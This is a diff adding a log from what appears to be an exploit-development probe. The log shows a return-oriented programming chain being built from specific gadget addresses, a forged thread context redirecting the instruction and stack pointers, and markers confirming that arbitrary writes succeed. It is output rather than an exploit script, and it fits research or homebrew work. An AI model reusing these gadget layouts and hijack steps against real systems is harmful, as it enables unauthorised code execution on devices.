@@ -1,0 +1,25 @@
+=== PROBE 127j: ROP WRITE LOOP ===
+
+pid=120
+eboot=0x0300C0000
+
+[A] Building ROP chain
+  [0x00]=0x0000000030189DFE (pop_rdi)
+  [0x08]=0x0000000310972EE0 (shared)
+  [0x20]=0x0000000030152C67 (mov_w)
+  [0x78]=0x00000000300C09A2 (pop_rsp)
+  [0x80]=0x0000000310B5C500 (chain_start)
+
+[B] Ucontext (RIP=ret, RSP=chain)
+  RIP=0x0300C0042 RSP=0x310B5C500
+  ret=0x0000000000000000 tid=0x0000000000018CB1
+  shared[0] =0xDEADBEEFCAFE0001
+  shared[8] =0x2222222233333333
+  shared[16]=0xAAAABBBBCCCCDDDD
+  *** MARKER 1 OK ***
+  *** MARKER 2 OK ***
+  *** MARKER 3 OK — FULL ROP CHAIN WORKS ***
+  thr_kill=0x0000000000000000
+
+canary=OK
+=== 127j COMPLETE ===
